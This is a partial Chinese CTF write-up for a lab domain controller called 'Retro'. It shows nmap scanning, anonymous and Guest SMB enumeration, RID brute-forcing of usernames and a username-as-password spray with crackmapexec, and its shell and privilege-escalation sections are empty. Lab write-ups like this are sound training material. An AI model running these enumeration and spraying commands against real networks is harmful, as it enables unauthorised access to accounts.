---
description: DC / SMB枚举 / ESC1 / Easy
---

# ✔️ Retro

## 建立立足点

### 1. 基本信息收集&枚举：

* 端口扫描，从开启的端口判断该主机为域控机器：

```bash
nmap -sC -sV -p- -oA retro 10.129.234.44 --open 
```

<figure><img src="../../.gitbook/assets/1 (40).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/2 (39).png" alt=""><figcaption></figcaption></figure>

* 将域名写入/hosts文件：

```bash
echo '10.129.13.15   DC.retro.vl retro.vl' > /etc/hosts
```

### 2. 服务枚举：

#### SMB服务：

* 匿名登录可以看到几个共享文件夹，其中`Trainees` 和 `Notes` 值得注意：

```bash
smbclient -N -L //10.129.234.44
```

<figure><img src="../../.gitbook/assets/3 (36).png" alt=""><figcaption></figcaption></figure>

* 匿名登录`/Trainees` 文件夹，找到一个Import.txt文件，下载到本地打开查看其内容：

```bash
smbclient \\\\10.129.234.44\\Trainees
get Import.txt
```

<figure><img src="../../.gitbook/assets/4 (36).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/5 (37).png" alt=""><figcaption></figcaption></figure>

* 尝试使用Guset空密码登录SMB服务成功，这意味着我可以枚举域内用户有哪些：

```bash
nxc smb 10.129.234.44 -u 'Guest' -p ''
```

<figure><img src="../../.gitbook/assets/6 (39).png" alt=""><figcaption></figcaption></figure>

* 使用guest账户rid暴破出域内的有效用户名：

```bash
nxc smb 10.129.234.44 -u "guest" -p "" --rid-brute | grep -i 'sidtypeuser' | awk '{print $6}' | cut -d '\' -f 2 |tee username.txt
```

<figure><img src="../../.gitbook/assets/10 (35).png" alt=""><figcaption></figcaption></figure>

* 从邮件内容提示猜测用户Trainees大概率使用弱口令进行登录，因此复制一遍以上的用户名作为password.txt文件，尝试枚举出是否有使用用户名作为密码的账户：

```bash
crackmapexec smb -u username.txt -p password.txt -d retro.vl 10.129.234.44
```

<figure><img src="../../.gitbook/assets/12 (31).png" alt=""><figcaption></figcaption></figure>

* 找到了用户Trainee使用了和用户名相同的密码，至此获取到第一个有效登录凭证：

<figure><img src="../../.gitbook/assets/13 (31).png" alt=""><figcaption></figcaption></figure>







#### 其他服务：





### 2. Get Shell：













## 权限提升

### 1. 域内信息收集&枚举：











### 2. ROOT：











{% hint style="info" %}

{% endhint %}
